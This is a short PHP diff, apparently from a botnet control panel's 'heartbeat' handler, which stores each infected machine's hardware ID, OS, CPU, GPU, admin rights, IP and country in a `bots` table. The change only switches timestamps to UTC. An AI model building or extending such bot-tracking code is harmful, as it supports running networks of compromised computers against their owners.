@@ -18,7 +18,6 @@ class heartbeat
         if (isset($data) && ! empty($data)) {
             //{bbed3e02-0b41-11e3-8249-806e6f6e6963}@Microsoft Windows 8 x64 Edition@Intel(R) Core(TM) i7-5950HQ CPU @ 2.90GHz@NVIDIA GeForce GTX 980M   NVIDIA GeForce GTX 980M   @v4.0@false@25165824 @ip @countryname @countrycode
             //ON DUPLICATE KEY UPDATE
-            date_default_timezone_set('America/New_York');
             $p = [];
             $p[':hwid'] = $data[0];
 
@@ -31,7 +30,7 @@ class heartbeat
             $p[':net'] = $data[5];
             $p[':adm'] = $data[6];
             $p[':ram'] = $data[7];
-            $p[':ls'] = date('Y-m-d H:i:s'); //date("h:i:sa");
+            $p[':ls'] = gmdate('Y-m-d H:i:s'); //date("h:i:sa");
 
             $result = $this->pdo->prepare('INSERT INTO `bots` (`hwid`, `country`, `country_code`, `ip`, `os`, `cpu`, `gpu`, `net`, `admin`, `ram`, `lastseen` ) VALUES (:hwid, :c, :cc, :ip, :os, :cpu, :gpu, :net, :adm, :ram, :ls) ON DUPLICATE KEY UPDATE `country` = VALUES(country), `country_code` = VALUES(country_code), `ip` = VALUES(ip), `os` = VALUES(os), `cpu` = VALUES(cpu), `gpu` = VALUES(gpu), `net` = VALUES(net), `admin` = VALUES(admin), `ram` = VALUES(ram), `lastseen` = VALUES(lastseen)');
             $result->execute($p);
